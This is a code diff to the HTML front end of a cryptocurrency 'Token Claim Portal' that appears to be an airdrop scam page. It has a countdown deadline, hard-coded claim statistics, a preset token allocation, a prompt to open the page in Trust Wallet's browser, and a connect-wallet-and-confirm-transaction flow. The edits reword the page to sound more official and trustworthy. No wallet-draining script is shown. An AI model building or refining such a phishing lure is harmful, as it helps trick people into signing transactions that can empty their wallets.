@@ -3,10 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Token Airdrop Claim</title>
+  <title>Token Claim Portal</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <link rel="stylesheet" href="style.css">
   <style>
+    /* Additional styles for improved UI */
     .token-icon {
       width: 24px;
       height: 24px;
@@ -18,6 +19,40 @@
       height: 80px;
       object-fit: contain;
     }
+    .wallet-option {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      background: #f8f9fa;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .wallet-option:hover {
+      background: #e9ecef;
+    }
+    .wallet-option img {
+      width: 24px;
+      height: 24px;
+    }
+    .network-selector select {
+      background-color: #f8f9fa;
+      border: 1px solid #e0e0e0;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    .token-item {
+      padding: 12px;
+      background: #f8f9fa;
+      border-radius: 8px;
+      margin-bottom: 8px;
+    }
   </style>
 </head>
 <body>
@@ -25,8 +60,8 @@
     <div class="card">
       <div class="header">
         <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Token Logo" class="logo">
-        <h1>Token Airdrop Claim</h1>
-        <p class="description">Claim your free tokens before May 9, 2025!</p>
+        <h1>Token Claim Portal</h1>
+        <p class="description">Secure your token allocation before May 9, 2025</p>
         
         <div class="countdown">
           <div class="countdown-item">
@@ -53,7 +88,7 @@
           <i class="fas fa-coins"></i>
           <div>
             <span class="stat-value">5,000,000</span>
-            <span class="stat-label">Total Tokens</span>
+            <span class="stat-label">Total Allocation</span>
           </div>
         </div>
         <div class="stat-item">
@@ -67,27 +102,19 @@
           <i class="fas fa-wallet"></i>
           <div>
             <span class="stat-value">3,872</span>
-            <span class="stat-label">Claims</span>
+            <span class="stat-label">Successful Claims</span>
           </div>
         </div>
       </div>
       
       <div class="mobile-warning">
-        <i class="fas fa-mobile-alt"></i> For best experience on mobile, please use Trust Wallet's in-app browser
+        <i class="fas fa-mobile-alt"></i> For mobile users, please use Trust Wallet's in-app browser
       </div>
       
       <div class="trust-container" id="trustContainer">
         <button id="openTrustWallet" class="trust-btn">
           <i class="fas fa-external-link-alt"></i> Open in Trust Wallet
         </button>
-        <div class="manual-steps" id="manualSteps">
-          <p><strong>If Trust Wallet didn't open automatically:</strong></p>
-          <ol style="text-align: left; padding-left: 20px; margin-top: 10px;">
-            <li>Open Trust Wallet app</li>
-            <li>Tap the <strong>Browser</strong> tab</li>
-            <li>Enter this URL: <span id="currentUrl" style="word-break: break-all;"></span></li>
-          </ol>
-        </div>
       </div>
       
       <div class="network-selector">
@@ -100,29 +127,26 @@
       
       <div class="token-list">
         <div class="token-item" data-network="ethereum">
-          <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="REWARD" class="token-icon">
-          <span class="token-name">REWARD Token</span>
-          <span class="token-network">Ethereum</span>
+          <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH" class="token-icon">
+          <span class="token-name">Ethereum Network</span>
         </div>
         <div class="token-item" data-network="bsc">
-          <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="REWARD" class="token-icon">
-          <span class="token-name">REWARD Token</span>
-          <span class="token-network">BSC</span>
+          <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="BNB" class="token-icon">
+          <span class="token-name">Binance Smart Chain</span>
         </div>
         <div class="token-item" data-network="polygon">
-          <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" alt="REWARD" class="token-icon">
-          <span class="token-name">REWARD Token</span>
-          <span class="token-network">Polygon</span>
+          <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" alt="MATIC" class="token-icon">
+          <span class="token-name">Polygon Network</span>
         </div>
       </div>
       
       <div class="claim-card">
         <div class="claim-info">
           <span class="claim-label">Your Allocation</span>
-          <span class="claim-amount">1,250 TOK</span>
+          <span class="claim-amount">1,250 Tokens</span>
         </div>
         <button id="connectWallet" class="btn">
-          <i class="fas fa-wallet"></i> Connect Wallet & Claim
+          <i class="fas fa-wallet"></i> Connect Wallet
         </button>
       </div>
       
@@ -131,22 +155,22 @@
       <div id="status" class="status"></div>
       
       <div class="steps">
-        <h3>How to Claim:</h3>
+        <h3>Claim Process:</h3>
         <div class="step">
           <div class="step-number">1</div>
           <div class="step-content">Connect your wallet</div>
         </div>
         <div class="step">
           <div class="step-number">2</div>
-          <div class="step-content">Verify eligibility</div>
+          <div class="step-content">Verify your allocation</div>
         </div>
         <div class="step">
           <div class="step-number">3</div>
-          <div class="step-content">Sign transaction</div>
+          <div class="step-content">Confirm the transaction</div>
         </div>
         <div class="step">
           <div class="step-number">4</div>
-          <div class="step-content">Receive tokens</div>
+          <div class="step-content">Receive your tokens</div>
         </div>
       </div>
       
